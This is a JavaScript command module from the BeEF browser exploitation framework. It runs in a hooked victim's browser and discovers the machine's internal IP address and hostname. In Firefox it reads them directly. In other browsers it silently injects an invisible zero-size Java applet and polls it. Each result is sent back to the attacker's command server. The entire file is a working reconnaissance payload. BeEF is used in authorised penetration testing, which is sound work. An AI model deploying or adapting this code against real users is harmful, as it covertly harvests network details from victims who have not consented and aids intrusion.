//
//   Copyright 2011 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
	if (beef.browser.isFF()) {
		var internal_ip = beef.net.local.getLocalAddress();
		var internal_hostname = beef.net.local.getLocalHostname();

		if(internal_ip && internal_hostname) {
			beef.net.send('<%= @command_url %>', <%= @command_id %>,
				'internal_ip='+internal_ip+'&internal_hostname='+internal_hostname);
		}
	} else {
		//Trying to insert the Beeffeine applet
		content = "<APPLET code='Beeffeine' codebase='/Beeffeine.class' width=0 height=0 id=beeffeine name=beeffeine></APPLET>";
		$j('body').append(content);
		internal_counter = 0;
		//We have to kick off a loop now, because the user has to accept the running of the applet perhaps
		
		
		function waituntilok() {
			try {
				output = document.beeffeine.MyIP();
				beef.net.send('<%= @command_url %>', <%= @command_id %>, output);
				$j('#beeffeine').detach();
				return;
			} catch (e) {
				internal_counter++;
				if (internal_counter > 20) { //Timeout after 20 seconds
					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=time out');
					$j('#beeffeine').detach(); //kill the applet
					return;
				}
				setTimeout(function() {waituntilok()},1000);
			}
		}
		//Lets not kick this off just yet
		setTimeout(function() {waituntilok()},5000);
	}
});
